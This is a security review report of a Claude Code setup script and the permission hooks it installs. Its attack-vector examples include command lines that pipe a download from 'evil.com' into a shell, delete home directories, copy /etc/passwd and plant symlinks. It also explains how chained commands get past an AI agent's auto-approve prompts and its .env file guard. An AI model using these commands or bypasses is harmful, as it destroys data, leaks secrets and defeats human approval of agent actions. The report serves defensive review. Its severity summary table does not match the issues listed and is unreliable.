# Security Review Report: optimize-claude.sh

**File Reviewed:** `/c/projects/claude-code-optimizer/scripts/linux/optimize-claude.sh`
**Review Date:** 2026-04-07
**Review Approach:** Adversarial analysis (no skill/tooling)

---

## Executive Summary

This script configures Claude Code optimization settings and installs dependencies. While the script has good intentions with privacy features, it contains several security vulnerabilities ranging from medium to high severity. The most critical issues involve:

1. **Trivial whitelist bypass** in auto-approve.sh hook enabling arbitrary command execution
2. **Predictable temp file paths** vulnerable to symlink attacks
3. **In-place file modifications** without atomic operations
4. **Insufficient input sanitization** in hook scripts processing file paths from JSON

---

## Critical Severity Issues

### 1. Trivial Whitelist Bypass in auto-approve.sh (Lines 1232-1270)

**Vulnerability:** The `SAFE_PREFIXES` whitelist uses simple prefix matching (`[[ "$COMMAND" == "$prefix"* ]]`) which is trivially bypassable.

**Attack Vector:**
```bash
# These commands would be auto-approved despite being destructive:
"ls -la; rm -rf /home/user"        # Matches "ls" prefix
"cat /etc/passwd > /tmp/stolen"    # Matches "cat " prefix  
"echo hello && curl evil.com | sh" # Matches "echo " prefix
"git status; sudo rm -rf /"        # Matches "git status" prefix
```

**Impact:** Arbitrary command execution with auto-approval, bypassing permission prompts.

**Line Numbers:** 1264-1269

**Fix:** Replace prefix matching with strict allowlist using exact command signatures or word-boundary regex validation:
```bash
# Safer approach - check word boundaries and no shell metacharacters
if [[ "$COMMAND" =~ ^ls([[:space:]]+-[a-zA-Z]+)*[[:space:]]*$ ]]; then
    # Additional check for no shell metacharacters
    if [[ ! "$COMMAND" =~ [;|&\$\(\)\{\}\[\]`] ]]; then
        # approve
    fi
fi
```

---

### 2. Predictable Temp File Paths - Symlink Attack (Lines 303, 510, 570, 759, 1035, 1056)

**Vulnerability:** Multiple uses of predictable `/tmp/` paths without `mktemp -u` or proper cleanup handlers.

**Affected Lines:**
- Line 303: `ERR_OUTPUT=$(mktemp)` - not using mktemp properly in some cases
- Line 1001: `LOG_FILE="/tmp/claude-hook-validation.log"` - fixed path
- Line 1035: `temp_file="/tmp/claude-resize-$(basename "$FILE_PATH")"` - predictable with attacker-controlled filename
- Line 1056: `temp_txt="/tmp/claude-pdf-$(date +%s).txt"` - timestamp can be predicted
- Line 1116: `LOG_FILE="/tmp/claude-file-guard.log"` - fixed path
- Line 1129: `LOG_FILE="/tmp/claude-auto-approve.log"` - fixed path
- Line 1203: `LOG_FILE="/tmp/claude-hook-validation.log"` - fixed path
- Line 1291: `LOG_FILE="/tmp/claude-auto-format.log"` - fixed path

**Attack Vector:**
```bash
# Attacker creates symlinks before script runs:
ln -s /home/user/.bashrc /tmp/claude-resize-secret.png
ln -s /etc/passwd /tmp/claude-pdf-$(date +%s).txt  # race condition on timestamp
```

**Impact:** Arbitrary file overwrite via symlink following.

**Fix:** Use `mktemp` with proper cleanup, or write to `$HOME/.claude/logs/` instead of `/tmp/`.

---

## High Severity Issues

### 3. Unsanitized File Path Usage in pretooluse.sh (Lines 998-1042)

**Vulnerability:** File paths extracted from JSON via `jq` are used directly in shell commands without sanitization.

**Affected Lines:**
- Line 998: `FILE_PATH="$(echo "$INPUT" | jq -r '.tool_input.file_path // .tool_input.filePath // empty')"`
- Line 1025: `identify_output=$(magick identify -format "%wx%h" "$FILE_PATH" 2>/dev/null)`
- Line 1037-1039: `magick "$FILE_PATH" -resize ...` and `convert "$FILE_PATH" ...`
- Line 1041-1042: `cp "$temp_file" "$FILE_PATH"; rm -f "$temp_file"`

**Attack Vector:**
```json
{
  "tool_name": "Read",
  "tool_input": {
    "file_path": "image.png; rm -rf /home/user #.jpg"
  }
}
```

While the commands use quotes, downstream consumers or log parsers may not. The file path flows through multiple tools (ImageMagick, cp, rm) with varying parsing behaviors.

**Impact:** Potential command injection or file operations on unexpected paths.

**Fix:** Validate file paths against a whitelist pattern `^[a-zA-Z0-9_./-]+$` and reject paths with shell metacharacters.

---

### 4. Race Condition in In-Place File Modification (Lines 759-767)

**Vulnerability:** Non-atomic file modification when updating shell configuration.

**Code:**
```bash
local TEMP_FILE=$(mktemp)
sed "/$BLOCK_START/,/$BLOCK_END/d" "$SHELL_CONFIG_PATH" > "$TEMP_FILE"
mv "$TEMP_FILE" "$SHELL_CONFIG_PATH"          # Race: file is modified here
echo "" >> "$SHELL_CONFIG_PATH"                # Additional writes after mv
echo "$ENV_BLOCK" >> "$SHELL_CONFIG_PATH"
```

**Attack Vector:** If `$SHELL_CONFIG_PATH` is a symlink to a sensitive file, or if an attacker can modify it between `mv` and the append operations, they can inject content.

**Impact:** Partial writes, corrupted configuration, or writes to wrong target.

**Fix:** Use atomic write pattern with a single `mv` operation:
```bash
local TEMP_FILE=$(mktemp)
{
    sed "/$BLOCK_START/,/$BLOCK_END/d" "$SHELL_CONFIG_PATH"
    echo ""
    echo "$ENV_BLOCK"
} > "$TEMP_FILE"
chmod --reference="$SHELL_CONFIG_PATH" "$TEMP_FILE" 2>/dev/null || true
mv "$TEMP_FILE" "$SHELL_CONFIG_PATH"
```

---

### 5. Unvalidated sed Pattern with Variable (Line 760)

**Vulnerability:** `BLOCK_START` and `BLOCK_END` variables are used in sed without escaping.

**Code:**
```bash
sed "/$BLOCK_START/,/$BLOCK_END/d" "$SHELL_CONFIG_PATH" > "$TEMP_FILE"
```

**Risk:** If these markers ever contain sed-special characters (/, \, &, etc.), the sed command will fail or behave unexpectedly.

**Impact:** Failed configuration updates or unintended pattern matching.

**Fix:** Use sed with escaped delimiters or awk for more reliable block removal:
```bash
awk -v start="$BLOCK_START" -v end="$BLOCK_END" '
    index($0, start) { skip=1 }
    !skip { print }
    index($0, end) { skip=0 }
' "$SHELL_CONFIG_PATH" > "$TEMP_FILE"
```

---

## Medium Severity Issues

### 6. Insufficient Path Validation in file-guard.sh (Lines 1119-1198)

**Vulnerability:** The blocked patterns use simple regex matching that can be bypassed with path variations.

**Affected Lines:** 1119-1135 (BLOCKED_PATTERNS), 1144-1152 (check_path function)

**Bypass Examples:**
```bash
# Pattern '\.env$' can be bypassed:
"config.env.backup"        # Doesn't match \.env$
".env/"                    # Directory traversal
"./.env"                   # Relative path
"/../.env"                 # Path traversal to .env elsewhere
```

**Attack Vector:** The `extract_redirect_target` function (lines 1155-1168) attempts to catch redirections but uses a regex that may miss edge cases:
```bash
# These might bypass detection:
echo x >~/.env              # No space (handled)
echo x >$HOME/.env          # Variable expansion (may not be caught)
echo x 1>.env               # Explicit file descriptor
exec >.env                  # exec redirection
```

**Fix:** Normalize paths using `realpath` or `readlink -f` before checking patterns, and validate the final resolved path.

---

### 7. Content Truncation Without Warning (Lines 1060-1062, 1086-1088)

**Vulnerability:** PDF and document content is silently truncated at 9500 characters.

**Code:**
```bash
if [[ ${#content} -gt 9500 ]]; then
    content="${content:0:9500}\n\n[... TRUNCATED - file too large]"
fi
```

**Impact:** Silent data loss - user may not realize content was truncated, leading to incomplete analysis or decisions based on partial data.

**Fix:** Log truncation events prominently, or refuse to process files that would be truncated (fail safely).

---

### 8. Cross-Platform stat Command Inconsistency (Lines 1031, 1043)

**Vulnerability:** Fallback between BSD and GNU stat may behave differently on edge cases.

**Code:**
```bash
file_size=$(stat -f%z "$FILE_PATH" 2>/dev/null || stat -c%s "$FILE_PATH" 2>/dev/null)
```

**Risk:** If both stat commands fail (e.g., on a restricted file), `file_size` is empty, causing the comparison `[[ $file_size -gt $max_bytes ]]` to fail with error or behave unexpectedly.

**Fix:** Explicitly handle the error case:
```bash
file_size=$(stat -f%z "$FILE_PATH" 2>/dev/null || stat -c%s "$FILE_PATH" 2>/dev/null)
if [[ -z "$file_size" ]]; then
    log "STAT_FAILED | $FILE_PATH"
    exit 0
fi
```

---

## Low Severity Issues

### 9. In-Place sed Without Backup (Lines 808-809)

**Vulnerability:** `sed -i` creates a backup with `.bak` extension but this is platform-dependent.

**Code:**
```bash
sed -i.bak 's/"autoCompactEnabled": false/"autoCompactEnabled": true/g' "$CLAUDE_CONFIG" 2>/dev/null || \
sed -i '' 's/"autoCompactEnabled": false/"autoCompactEnabled": true/g' "$CLAUDE_CONFIG"
```

**Risk:** GNU sed and BSD sed have incompatible `-i` options. The second sed (BSD style) creates backup `.bak` with the empty string argument, which is actually correct for BSD, but the logic is confusing and error-prone.

**Fix:** Use Python or jq for JSON manipulation instead of sed for more reliability.

---

### 10. Sourcing Modified Configuration (Line 773)

**Vulnerability:** After modifying the shell config file, the script sources it into the current shell.

**Code:**
```bash
source "$SHELL_CONFIG_PATH" 2>/dev/null || true
```

**Risk:** If the configuration file was maliciously modified or corrupted during the write process, arbitrary code could be executed.

**Fix:** Validate the written content before sourcing, or export variables directly instead of relying on the modified file.

---

### 11. Backup File Naming Collision (Line 803)

**Vulnerability:** Timestamp-based backup naming could collide if script runs multiple times per second.

**Code:**
```bash
cp "$CLAUDE_CONFIG" "$CLAUDE_CONFIG.backup.$(date +%Y%m%d%H%M%S)"
```

**Risk:** If run twice in same second, backup is overwritten.

**Fix:** Add nanoseconds or PID: `$(date +%Y%m%d%H%M%S%N).$$`

---

### 12. Termux Detection Inconsistency (Lines 192-198, 226-229, 291-294)

**Vulnerability:** Multiple slightly different Termux detection methods used throughout the script.

**Functions:**
- `is_termux()` at line 192 checks `$TERMUX_VERSION`, `/data/data/com.termux`, `$PREFIX`
- Inline checks at lines 1079 and 465-466 use similar but not identical logic

**Risk:** Inconsistent detection could lead to security-sensitive code paths (package installation) being executed in unexpected environments.

**Fix:** Use a single, consistent detection function everywhere.

---

## Informational / Best Practice Issues

### 13. World-Readable Temp Files

**Observation:** `mktemp` creates files with mode 600 by default, but log files created at fixed `/tmp` paths may be world-readable depending on umask.

### 14. No Cleanup on Interrupt

**Observation:** The script sets `set -e` (line 14) but doesn't set up `trap` handlers to clean up temp files on SIGINT/SIGTERM.

### 15. Verbose Error Output Exposure (Lines 327-328, 536-537, 594-595)

**Observation:** Error output from failed commands is displayed to the user:
```bash
cat "$ERR_OUTPUT" | head -10
```

This could potentially leak sensitive information from command failures.

---

## Summary Table

| Severity | Count | Issue Categories |
|----------|-------|------------------|
| Critical | 2 | Whitelist bypass, Symlink attacks |
| High | 5 | Shell injection, Race conditions, Path validation |
| Medium | 4 | Pattern bypass, Data loss, Command inconsistency |
| Low | 5 | Backup issues, Sourcing risks, Detection inconsistency |

---

## Recommendations

1. **Immediately fix** the auto-approve whitelist (CRITICAL)
2. **Immediately fix** temp file handling to use `$HOME/.claude/` instead of `/tmp/` (CRITICAL)
3. Add input validation for all file paths from external sources
4. Use atomic file operations for all configuration modifications
5. Normalize paths before pattern matching in file-guard.sh
6. Add explicit error handling for all stat/identify commands
7. Implement trap handlers for cleanup on interruption
8. Consider using Python or jq instead of sed for JSON manipulation

---

*Report generated via adversarial review of optimize-claude.sh*
